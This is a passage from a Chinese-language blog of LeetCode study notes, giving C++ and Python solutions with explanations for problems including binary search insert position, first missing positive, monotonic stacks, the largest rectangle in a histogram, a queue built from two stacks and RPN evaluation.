class="keyword">int</span> sat, <span class="keyword">int</span> end, <span class="keyword">int</span> target)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sat == end) <span class="keyword">return</span> target &lt;= nums[sat] ? sat : sat+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> mid = (sat + end) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target == nums[mid])</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; nums[mid]) </span><br><span class="line">            <span class="keyword">return</span> re(nums, sat, mid, target);</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">return</span> re(nums, mid + <span class="number">1</span>, end, target);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>二分查找迭代版</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">searchInsert</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.size() == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &lt; nums[<span class="number">0</span>]) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &gt; nums[nums.size()<span class="number">-1</span>]) <span class="keyword">return</span> nums.size();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> sat = <span class="number">0</span>, end = nums.size()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (sat == end) <span class="keyword">return</span> target &lt;= nums[sat] ? sat : sat+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> mid = (sat+end)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (target == nums[mid])</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; nums[mid]) </span><br><span class="line">                end = mid;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                sat = mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="38-外观数列"><a href="#38-外观数列" class="headerlink" title="38. 外观数列"></a>38. 外观数列</h2><p>BF，枚举之前的字符串，处理每个字符串的方法，遇到相同的字符，计数器+1，遇到不同的字符，将计数器和当前字符添加到nstr的尾部</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">countAndSay</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> str = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> nstr = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">char</span> cur = str[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (j &lt; str.length())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">while</span> (j &lt; str.length() &amp;&amp; str[j] == cur)</span><br><span class="line">                &#123;</span><br><span class="line">                    j++;</span><br><span class="line">                    num++;</span><br><span class="line">                &#125;</span><br><span class="line">                nstr.append(to_string(num));</span><br><span class="line">                nstr.push_back(cur);</span><br><span class="line">                <span class="keyword">if</span> (j &lt; str.length())</span><br><span class="line">                &#123;</span><br><span class="line">                    cur = str[j];</span><br><span class="line">                    num = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            str = nstr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="困难题"><a href="#困难题" class="headerlink" title="困难题"></a>困难题</h1><h2 id="4-寻找两个有序数组的中位数"><a href="#4-寻找两个有序数组的中位数" class="headerlink" title="4. 寻找两个有序数组的中位数"></a>4. 寻找两个有序数组的中位数</h2><p>要求时间复杂度O(log(m+n))，想法每次砍掉一半的候选人，但出现了问题。</p>
<p>假如m和n均为奇数，或者均为偶数，那么中位数必然是(ai+bj)/2，如果m和n一奇一偶，那么中位数必然是ai或者bj。</p>
<p>每次砍掉一半，意味着m和n的奇偶性会变化，然后出事。</p>
<p>比如奇数，还是奇数，xxxx但是偶数，有可能变成奇数或者偶数。所以一奇一偶没问题。</p>
<p>两奇或者两偶的需要找第(m+n)/2-1大和(m+n)/2大的数</p>
<ul>
<li>一种想法是：把两个数组中最大的一个数去掉，变成了一奇一偶，算出原第(m+n)/2-1大的数；把最小的一个数也去掉，变成了一奇一偶，算出原第(m+n)/2-1大的数，然后相加除以二</li>
<li>不过这样相当于算了两遍，改进一下，算出原第(m+n)/2-1大的数后，下一个数的候选人是这个数所在数组的后一个数，或者另一个数组的二分查找的刚好大于等于这个数的数</li>
</ul>
<h2 id="41-缺失的第一个正数"><a href="#41-缺失的第一个正数" class="headerlink" title="41. 缺失的第一个正数"></a>41. 缺失的第一个正数</h2><p>给你一个未排序的整数数组，请你找出其中没有出现的最小的正整数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">firstMissingPositive</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//原地哈希</span></span><br><span class="line">        <span class="comment">//1. 把不在[1, N]的负数和0设为N+1，因为是无效数据，不能影响后面的标记</span></span><br><span class="line">        <span class="comment">//2. 把在[1, N]的数m，令nums[m-1] = -abs(nums[m-1])，打上标记</span></span><br><span class="line">        <span class="comment">//3. 遍历数组，如果有正数，说明没被标记，返回下标+1；如果遍历完了，说明[1, N]都出现了，返回N+1</span></span><br><span class="line">        <span class="keyword">int</span> N = nums.size();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &lt;= <span class="number">0</span>)</span><br><span class="line">                nums[i] = N+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> absi = <span class="built_in">abs</span>(nums[i]);</span><br><span class="line">            <span class="keyword">if</span> (absi &gt;= <span class="number">1</span> &amp;&amp; absi &lt;= N)</span><br><span class="line">            &#123;</span><br><span class="line">                nums[absi - <span class="number">1</span>] = -<span class="built_in">abs</span>(nums[absi - <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> N+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="1019-链表中的下一个更大节点"><a href="#1019-链表中的下一个更大节点" class="headerlink" title="1019. 链表中的下一个更大节点"></a>1019. 链表中的下一个更大节点</h2><p>对于链表 [2, 5, 1, 1, 4]</p>
<p>next[] = [5, 0, 4, 4, 0]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Definition for singly-linked list.</span><br><span class="line"> * struct ListNode &#123;</span><br><span class="line"> *     int val;</span><br><span class="line"> *     ListNode *next;</span><br><span class="line"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span><br><span class="line"> * &#125;;</span><br><span class="line"> */</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;int&gt; nextLargerNodes(ListNode* head) &#123;</span><br><span class="line">        //单调递减栈</span><br><span class="line">        //1. 把链表转为数组，方便后面按下标索引</span><br><span class="line">        //2. 遍历数组，如果nums[i] &lt;= nums[top]就一直pop，pop一个就令next[top] = i，然后push(i)</span><br><span class="line">        //3. 把栈里剩余的元素的next置为0</span><br><span class="line"></span><br><span class="line">        vector&lt;int&gt; nums;</span><br><span class="line">        while (head != NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            nums.push_back(head-&gt;val);</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stack&lt;int&gt; stk;</span><br><span class="line">        vector&lt;int&gt; answer(nums.size());</span><br><span class="line">        for (int i = 0; i &lt; nums.size(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            while (!stk.empty() &amp;&amp; nums[i] &gt; nums[stk.top()])</span><br><span class="line">            &#123;</span><br><span class="line">                answer[stk.top()] = nums[i];</span><br><span class="line">                stk.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            stk.push(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while (!stk.empty())</span><br><span class="line">        &#123;</span><br><span class="line">            answer[stk.top()] = 0;</span><br><span class="line">            stk.pop();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="896-单调数列"><a href="#896-单调数列" class="headerlink" title="896. 单调数列"></a>896. 单调数列</h2><p>判断一个数列是否是单调递增or单调递减，解法1，往后看；解法2，两个单调栈</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isMonotonic</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//简单往后看</span></span><br><span class="line">        <span class="comment">//1. 设置dir = 0</span></span><br><span class="line">        <span class="comment">//2. 遍历A，如果dir = 0，prev &lt; cur，dir = 1（递增）；prev &gt; cur, dir = -1（递减）；相等不管</span></span><br><span class="line">        <span class="comment">//如果dir = -1，prev &lt; cur，return false；其他不管</span></span><br><span class="line">        <span class="comment">//如果dir = 1，prev &gt; cur，return false；其他不管</span></span><br><span class="line">        <span class="comment">//3. 最后return true</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (A.size() &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> dir = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> prev = A[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; A.size(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> cur = A[i];</span><br><span class="line">            <span class="keyword">if</span> (dir == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (prev &lt; cur) dir = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (prev &gt; cur) dir = <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (dir == <span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (prev &lt; cur) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (dir == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (prev &gt; cur) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            prev = cur;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isMonotonic</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//两个单调栈</span></span><br><span class="line">        <span class="comment">//1. 一个递增栈incStk，如果cur &gt;= top，就往incStk中push(cur)，否则一路pop直到cur &gt;= top，然后push(cur)</span></span><br><span class="line">        <span class="comment">//2. 一个递减栈decStk，一路pop直到 cur &lt;= top，然后push(cur)</span></span><br><span class="line">        <span class="comment">//3. 如果是单调数列，那么两个栈一定1个是满的，另一个无所谓</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; increaseStk, decreaseStk;</span><br><span class="line">        <span class="keyword">int</span> N = A.size();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> cur = A[i];</span><br><span class="line">            <span class="keyword">while</span> (!increaseStk.empty() &amp;&amp; cur &lt; increaseStk.top())</span><br><span class="line">            &#123;</span><br><span class="line">                increaseStk.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            increaseStk.push(cur);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (!decreaseStk.empty() &amp;&amp; cur &gt; decreaseStk.top())</span><br><span class="line">            &#123;</span><br><span class="line">                decreaseStk.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            decreaseStk.push(cur);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> size1 = increaseStk.size();</span><br><span class="line">        <span class="keyword">int</span> size2 = decreaseStk.size();</span><br><span class="line">        <span class="keyword">if</span> (size1 == N || size2 == N)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="84-柱状图中最大的矩形"><a href="#84-柱状图中最大的矩形" class="headerlink" title="84. 柱状图中最大的矩形"></a>84. 柱状图中最大的矩形</h2><p><img src="/2020/01/27/LeetCode刷题笔记/C:/Users\hp\AppData\Roaming\Typora\typora-user-images\image-20200630090405899.png" alt="image-20200630090405899"></p>
<p>解法1：暴力</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int largestRectangleArea(vector&lt;int&gt;&amp; heights) &#123;</span><br><span class="line">        //暴力</span><br><span class="line">        //1. 对于第i个柱子，他所在的最大矩形，开始位置在往左看第一个比他矮的柱子下标+1</span><br><span class="line">        //结束位置在往右看第一个比他矮的柱子下标-1</span><br><span class="line">        //高度是他自己的高度</span><br><span class="line">        //2. 遍历一遍，时间O(n2)，空间原地O(n)</span><br><span class="line">        //3. 为了方便处理头尾情况，在heights数组的前后各加一个0</span><br><span class="line"></span><br><span class="line">        heights.insert(heights.begin(), 0);</span><br><span class="line">        heights.push_back(0);</span><br><span class="line"></span><br><span class="line">        int N = heights.size();</span><br><span class="line">        int Max = 0;</span><br><span class="line">        for (int i = 1; i &lt; N - 1; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            int H = heights[i];</span><br><span class="line">            int W_begin = 0 + 1;</span><br><span class="line">            int W_end = N - 1; </span><br><span class="line">            for (int j = i - 1; j &gt;= 0; j--)</span><br><span class="line">            &#123;</span><br><span class="line">                if (heights[j] &lt; H)</span><br><span class="line">                &#123;</span><br><span class="line">                    W_begin = j + 1;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            for (int j = i + 1; j &lt; N; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                if (heights[j] &lt; H)</span><br><span class="line">                &#123;</span><br><span class="line">                    W_end = j - 1;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            int W = W_end - W_begin + 1;</span><br><span class="line">            int Rectangle = W * H;</span><br><span class="line">            Max = max(Max, Rectangle);</span><br><span class="line">        &#125;</span><br><span class="line">        return Max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>解法2：单调栈</p>
<p>观察到，我们需要的是一个柱子的，左边第一个比他小的，和右边第一个比他小的；而单调递增栈恰好有这个性质：当一个元素被pop的时候，此刻的栈顶是左边第一个比他小的，让他pop的元素是右边第一个比他小的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">largestRectangleArea</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; heights)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//单调递增栈</span></span><br><span class="line">        <span class="comment">//1. 当一个元素被pop时，pop后的栈顶元素，是左边从右往左数第一个比他小的，</span></span><br><span class="line">        <span class="comment">//让他pop的元素，是右边从左往右数第一个比他小的</span></span><br><span class="line">        <span class="comment">//2. 由此可以在每个元素被pop时计算出对应的矩形面积</span></span><br><span class="line">        <span class="comment">//3. 注意，递增栈中存的是下标，不是值</span></span><br><span class="line">        <span class="comment">//4. 预先在heights数组的首尾插0，首部的0为了保证首元素计算正确，尾部的0是为了把栈里最后剩余元素都pop出去</span></span><br><span class="line"></span><br><span class="line">        heights.insert(heights.begin(), <span class="number">0</span>);</span><br><span class="line">        heights.push_back(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; incStk;</span><br><span class="line">        <span class="keyword">int</span> N = heights.size();</span><br><span class="line">        <span class="keyword">int</span> Max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (!incStk.empty() &amp;&amp; heights[i] &lt; heights[incStk.top()])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> top = incStk.top();</span><br><span class="line">                <span class="keyword">int</span> H = heights[top];</span><br><span class="line">                <span class="keyword">int</span> W_end = i - <span class="number">1</span>;</span><br><span class="line">                incStk.pop();</span><br><span class="line">                <span class="keyword">if</span> (!incStk.empty())</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">int</span> W_begin = incStk.top() + <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">int</span> W = W_end - W_begin + <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">int</span> Rectangle = W * H;</span><br><span class="line">                    Max = max(Max, Rectangle);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            incStk.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="剑指-Offer-09-用两个栈实现队列"><a href="#剑指-Offer-09-用两个栈实现队列" class="headerlink" title="剑指 Offer 09. 用两个栈实现队列"></a><a href="https://leetcode-cn.com/problems/yong-liang-ge-zhan-shi-xian-dui-lie-lcof/" target="_blank" rel="noopener">剑指 Offer 09. 用两个栈实现队列</a></h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CQueue</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//双栈，一个headStk栈负责存队列的前半段，另一个tailStk负责存队列的后半段</span></span><br><span class="line">    <span class="comment">//1. 有appendTai的时候只要push到tailStk中</span></span><br><span class="line">    <span class="comment">//2. 有deleteHead时，先看headStk是否为空，</span></span><br><span class="line">    <span class="comment">//如果为空，从tailStk中依次pop出所有元素，</span></span><br><span class="line">    <span class="comment">//  并push到headStk中，如果仍然为空，返回-1，否则返回headStk的栈顶并pop</span></span><br><span class="line">    <span class="comment">//如果不为空，返回headStk的栈顶并pop</span></span><br><span class="line">    CQueue() &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">appendTail</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        tailStk.push(value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">deleteHead</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!headStk.empty())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> top = headStk.top();</span><br><span class="line">            headStk.pop();</span><br><span class="line">            <span class="keyword">return</span> top;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (!tailStk.empty())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> val = tailStk.top();</span><br><span class="line">                tailStk.pop();</span><br><span class="line">                headStk.push(val);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!headStk.empty())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> top = headStk.top();</span><br><span class="line">                headStk.pop();</span><br><span class="line">                <span class="keyword">return</span> top;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; headStk, tailStk;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your CQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * CQueue* obj = new CQueue();</span></span><br><span class="line"><span class="comment"> * obj-&gt;appendTail(value);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj-&gt;deleteHead();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<h2 id="300-最长上升子序列"><a href="#300-最长上升子序列" class="headerlink" title="300. 最长上升子序列"></a>300. 最长上升子序列</h2><p>解法1：</p>
<p>dp[i] 代表以nums[i]作为首元素的最长上升子序列的长度</p>
<p>转移方程：dp[i] = max(1, max(dp[j]) + 1)  (j &gt; i, num[j] &gt; nums[i])</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLIS</span><span class="params">(self, nums: List[int])</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> nums:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        dp = [<span class="number">1</span>] * len(nums)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">            max_len = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>, len(nums)):</span><br><span class="line">                <span class="keyword">if</span> nums[j] &gt; nums[i]:</span><br><span class="line">                    max_len = max(max_len, dp[j])</span><br><span class="line">            dp[i] = max_len + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> max(dp)</span><br></pre></td></tr></table></figure>
<h2 id="x-矩阵连乘"><a href="#x-矩阵连乘" class="headerlink" title="x. 矩阵连乘"></a>x. 矩阵连乘</h2><p>思考：矩阵Ai … Aj 的乘法次数记做A[i, j]，最后一次左右两坨矩阵的乘法位置记做k，最少次数是 min(A[i, k] + A[k+1, j] + p[i] <em> p[k] </em> p[j])</p>
<h2 id="150-逆波兰表达式求值"><a href="#150-逆波兰表达式求值" class="headerlink" title="150. 逆波兰表达式求值"></a>150. 逆波兰表达式求值</h2><p>只有+-*/四个运算符</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">evalRPN</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; tokens)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//用栈计算</span></span><br><span class="line">        <span class="comment">//1. 遇到数字push</span></span><br><span class="line">        <span class="comment">//2. 遇到操作符取出栈顶两个元素进行运算，然后push</span></span><br><span class="line">        <span class="comment">//3. 最后栈里剩下的就是结果</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tokens.size(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span>&amp; s = tokens[i];</span><br><span class="line">            <span class="keyword">if</span> (s[<span class="number">0</span>] &gt;= <span class="string">'0'</span> &amp;&amp; s[<span class="number">0</span>] &lt;= <span class="string">'9'</span> || s.length() &gt; <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> val = atoi(s.c_str());</span><br><span class="line">                stk.push(val);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> right = stk.top();</span><br><span class="line">                stk.pop();</span><br><span class="line">                <span class="keyword">int</span> left = stk.top();</span><br><span class="line">                stk.pop();</span><br><span class="line">                <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">switch</span> (s[<span class="number">0</span>])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'+'</span>: result = left+right; <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'-'</span>: result = left-right; <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'*'</span>: result = left*right; <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'/'</span>: result = left/right; <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                stk.push(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> stk.top();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="224-基本计算器"><a href="#224-基本计算器" class="headerlink" title="224. 基本计算器"></a>224. 基本计算器</h2><p>包含()+-，非负整数和空格</p>
<p>解法1：中缀转后缀，计算后缀</p>
